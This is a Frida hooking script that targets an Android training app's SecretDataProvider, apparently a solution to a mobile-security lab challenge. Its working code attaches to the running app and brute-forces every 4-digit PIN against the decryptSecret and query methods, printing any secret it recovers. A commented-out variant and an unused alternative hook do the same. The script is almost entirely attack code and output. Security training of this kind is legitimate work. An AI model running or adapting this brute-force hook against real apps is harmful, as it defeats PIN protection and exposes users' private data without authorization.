// METHOD 1: Hook the SecretDataProvider.query

// Java.perform(function() {
//     const Cursor = Java.use("android.database.Cursor");
//     const JavaObject = Java.use("java.lang.Object");
//     const SecretDataProvider = Java.use("com.mobilehackinglab.securenotes.SecretDataProvider");
//     SecretDataProvider.query.implementation = function(uri, projection, selection, selectionArgs, sortOrder) {
//         console.log("uri: " + uri);
//         console.log("selection: " + selection);

//         for (let i=0; i<=9999; i++) {
//             let pin = String(i).padStart(4, '0');
//             let obj = this.query(uri, null, "pin="+pin, null, null);
//             if (obj != null) {
//                 let cursor = Java.cast(obj, Cursor);
//                 try {
//                     if (cursor.moveToFirst()) {
//                         let columnIndex = cursor.getColumnIndex("Secret");
//                         if (columnIndex != -1) {
//                             console.log(pin + " : " + cursor.getString(columnIndex));
//                         }
//                     }
//                 } catch (error) {
//                     console.log(error);
//                 }
//                 cursor.close();
//             }
//         }

//         return this.query(uri, projection, selection, selectionArgs, sortOrder);
//     }
// });

// METHOD 2: Hook the SecretDataProvider.decryptSecret (Better)

function enumerateExistingInstance() {
    setTimeout(function () {     // Delay for the instance to be created
        Java.choose("com.mobilehackinglab.securenotes.SecretDataProvider", {
            onMatch(instance) {
                console.log("[+] Found: " + instance);
                console.log("[+] Start to brute-force the pin ...");
                for (let  i=0; i<=9999; i++) {
                    let paddedPin = String(i).padStart(4, '0');
                    console.log("Pin: " + paddedPin);
                    let result = instance.decryptSecret(paddedPin);
                    if (result && !(result.includes("\uFFFD"))) {    // Filter out unreadable strings
                        console.log("[+] " + paddedPin + " : " + result);
                        break;
                    }
                }
            },
            onComplete() {
                console.log("[-] Instance enumeration completed");
            }
        });
        
    }, 1000);
}

function hookMethod() {
    const SecretDataProvider = Java.use("com.mobilehackinglab.securenotes.SecretDataProvider");
    SecretDataProvider.decryptSecret.implementation = function (originalPin) {
        console.log("[+] Hook SecretDataProvider.decryptSecret()");

        for (let  i=0; i<=9999; i++) {
            let paddedPin = String(i).padStart(4, '0');
            console.log("Pin: " + paddedPin);
            let result = this.decryptSecret(paddedPin);
            if (result && !(result.includes("\uFFFD"))) {   // Filter out unreadable strings
                console.log("[+] " + paddedPin + " : " + result);
                return this.decryptSecret(paddedPin);
            }
        }
        
        return this.decryptSecret(originalPin);
    }
}


Java.perform(function () {
    console.log("\n");
    
    // Invoke the decryptSecret by ourselves on the SecretDataProvider instance
        // Enumerate for the existing SecureDataProvider 
    enumerateExistingInstance();
    
    // Hook the SecretDataProvider.decrpytSecret() and let the app call for us
    // hookMethod();
    
});